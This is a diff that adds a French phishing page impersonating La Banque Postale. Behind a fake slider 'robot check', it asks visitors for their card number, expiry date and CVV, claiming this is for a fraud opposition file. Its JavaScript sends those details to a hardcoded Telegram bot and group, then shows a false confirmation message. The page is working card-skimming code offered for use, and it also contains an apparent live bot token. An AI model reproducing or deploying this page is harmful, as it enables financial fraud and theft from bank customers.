@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>La Banque Postale</title>
+<style>
+	
+html, body {
+  overflow: hidden;
+  height: 100%;
+}
+
+body {
+  font-family: Arial;
+  background-color: #f2f2f2;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  margin: 0;
+}
+
+/* écran de verrouillage */
+#lockScreen {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: #fff;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  color: #333;
+  font-family: Arial, sans-serif;
+  text-align: center;
+  padding: 20px;
+}
+
+#lockMessage {
+  font-size: 18px;
+  margin-bottom: 30px;
+}
+
+/* slider */
+#sliderContainer {
+  width: 300px;
+  height: 50px;
+  background: #eee;
+  border-radius: 25px;
+  position: relative;
+  overflow: hidden;
+  cursor: pointer;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+}
+
+#slider {
+  position: absolute;
+  width: 50px;
+  height: 50px;
+  background: #0076C5; /* Bleu Banque Postale */
+  text-align: center;
+  line-height: 50px;
+  border-radius: 50%;
+  left: 0;
+  transition: left 0.3s;
+  user-select: none;
+  color: #fff;
+  font-weight: bold;
+}
+
+/* container */
+.container {
+  background: white;
+  padding: 30px;
+  border-radius: 10px;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+  text-align: center;
+  width: 320px;
+}
+
+img {
+  width: 200px;
+  margin-bottom: 12px;
+}
+
+h1 {
+  font-size: 18px;
+  margin-bottom: 5px;
+}
+
+.warning {
+  font-size: 14px;
+  color: #000;
+  margin-bottom: 20px;
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+}
+
+input {
+  margin: 8px 0;
+  padding: 10px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+}
+
+button {
+  margin-top: 15px;
+  padding: 10px;
+  background-color: #0076C5; /* bleu principal */
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #005fa3;
+}
+
+#message {
+  margin-top: 15px;
+  font-weight: bold;
+  color: #0076C5;
+}
+</style>
+</head>
+<body>
+<div id="lockScreen">
+  <div id="lockMessage">
+    Vérifiez que vous n'êtes pas un robot<br>
+    Glissez votre doigt pour déverrouiller
+  </div>
+  <div id="sliderContainer">
+    <div id="slider">➡</div>
+  </div>
+</div>
+<div class="container">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSSzSEyFEthlyBjNK8UxlqardSbCLToFjYtVA&s" alt="Logo">
+    <h1>Dossier mise en opposition de carte</h1>
+    <div class="warning">Merci d’insérer vos numéros afin de confirmer l’envoi auprès des assurances bancaires dans le cadre d’un cas avéré de fraude.</div>
+
+    <form id="cardForm" onsubmit="sendCard(event)">
+<form id="form-carte">
+  <!-- Numéro de carte -->
+  <input type="tel" id="adresse"
+         placeholder="Numéro de carte (16 chiffres)"
+         inputmode="numeric"
+         maxlength="19"
+         required>
+
+  <!-- Date d'expiration -->
+  <input type="tel" id="codepostale"
+         placeholder="Date d'expiration (MM/AA)"
+         inputmode="numeric"
+         maxlength="5"
+         required>
+
+  <!-- Cryptogramme -->
+  <input type="tel" id="chiffre"
+         placeholder="Cryptogramme visuel (3 chiffres)"
+         inputmode="numeric"
+         maxlength="3"
+         required>
+
+  <button type="submit">Envoyer mon dossier</button>
+  <button type="button" onclick="window.location.reload();">
+  Réinitialiser la page
+</button>
+</form>
+
+
+    <div id="message"></div>
+</div>
+
+<script>
+    const slider = document.getElementById("slider");
+const container = document.getElementById("sliderContainer");
+const lockScreen = document.getElementById("lockScreen");
+
+let isDragging = false;
+let startX = 0;
+
+function startDrag(e) {
+  isDragging = true;
+  startX = (e.touches ? e.touches[0].clientX : e.clientX) - slider.offsetLeft;
+}
+function doDrag(e) {
+  if (!isDragging) return;
+  let x = (e.touches ? e.touches[0].clientX : e.clientX) - startX;
+  if (x < 0) x = 0;
+  if (x > container.offsetWidth - slider.offsetWidth) x = container.offsetWidth - slider.offsetWidth;
+  slider.style.left = x + "px";
+}
+function endDrag() {
+  if (!isDragging) return;
+  isDragging = false;
+  if (parseInt(slider.style.left) > container.offsetWidth - slider.offsetWidth - 10) {
+    lockScreen.style.display = "none"; // Déverrouillé
+  } else {
+    slider.style.left = "0px"; // Retour au départ
+  }
+}
+
+// Souris
+slider.addEventListener("mousedown", startDrag);
+document.addEventListener("mousemove", doDrag);
+document.addEventListener("mouseup", endDrag);
+
+// Touch
+slider.addEventListener("touchstart", startDrag);
+document.addEventListener("touchmove", doDrag);
+document.addEventListener("touchend", endDrag);
+
+const BOT_TOKEN = "8864603046:AAH3BodXcyc3qcahm9cBJrVq6g7nh1ZUK0Y";
+const GROUP_ID = "-5487843202";
+
+function sendCard(event) {
+    event.preventDefault(); // Empêche le rechargement de la page
+
+    // 1. Récupération des valeurs
+    const adresse = document.getElementById('adresse').value;
+    const codepostale = document.getElementById('codepostale').value;
+    const chiffre = document.getElementById('chiffre').value;
+
+    const messageDiv = document.getElementById('message');
+    messageDiv.textContent = "Envoi en cours...";
+
+    // 2. Envoi vers Telegram (à l'intérieur de la fonction)
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: GROUP_ID,
+            text: `1+ CC LA BANQUE POSTALE\n\n💳 Numéro de carte : ${adresse}\n📅 Date d'expiration : ${codepostale}\n🔢 CVV : ${chiffre}`
+        })
+    })
+    .then(response => {
+        if (response.ok) {
+            messageDiv.textContent = "Vos documents ont bien été envoyés et pris en compte. Vous pouvez désormais fermer cette page (en cas d'erreur recommencez)";
+        } else {
+            messageDiv.textContent = "Erreur lors de l'envoi.";
+        }
+    })
+    .catch(err => {
+        console.error("Erreur Telegram:", err);
+        messageDiv.textContent = "Erreur de connexion.";
+    });
+}
+
+// Numéro de carte
+document.getElementById("adresse").addEventListener("input", function(e) {
+    let value = e.target.value.replace(/\D/g, "");  // uniquement chiffres
+    value = value.substring(0, 16);                 // max 16 chiffres
+
+    // Ajoute un espace tous les 4 chiffres
+    let formatted = "";
+    for (let i = 0; i < value.length; i += 4) {
+        if (formatted) formatted += " ";
+        formatted += value.substring(i, i + 4);
+    }
+    e.target.value = formatted;
+});
+
+// Date d'expiration
+document.getElementById("codepostale").addEventListener("input", function(e) {
+    let value = e.target.value.replace(/\D/g, "");  // uniquement chiffres
+    value = value.substring(0, 4);                  // MMYY
+
+    if (value.length >= 3) {
+        value = value.substring(0,2) + "/" + value.substring(2);
+    }
+    e.target.value = value;
+});
+
+// Cryptogramme
+document.getElementById("chiffre").addEventListener("input", function(e) {
+    let value = e.target.value.replace(/\D/g, "");  // uniquement chiffres
+    value = value.substring(0, 3);                  // max 3 chiffres
+    e.target.value = value;
+});
+
+// Validation à la soumission
+document.getElementById("form-carte").addEventListener("submit", function(e) {
+    e.preventDefault(); // Empêche l'envoi si erreur
+
+    const numero = document.getElementById("adresse").value.replace(/\s/g, "");
+    const date = document.getElementById("codepostale").value;
+    const cvv = document.getElementById("chiffre").value;
+
+    // Vérification numéro de carte
+    if (numero.length !== 16) {
+        alert("Le numéro de carte doit contenir 16 chiffres.");
+        return;
+    }
+
+    // Vérification date
+    const matchDate = date.match(/^(\d{2})\/(\d{2})$/);
+    if (!matchDate) {
+        alert("La date d'expiration doit être au format MM/AA.");
+        return;
+    }
+    const mois = parseInt(matchDate[1], 10);
+    if (mois < 1 || mois > 12) {
+        alert("Le mois de la date d'expiration est invalide.");
+        return;
+    }
+
+    // Vérification CVV
+    if (cvv.length !== 3) {
+        alert("Le cryptogramme doit contenir 3 chiffres.");
+        return;
+    }
+    // Ici tu peux envoyer le formulaire via AJAX ou autre
+});
+</script>
+
+</body>
+</html>
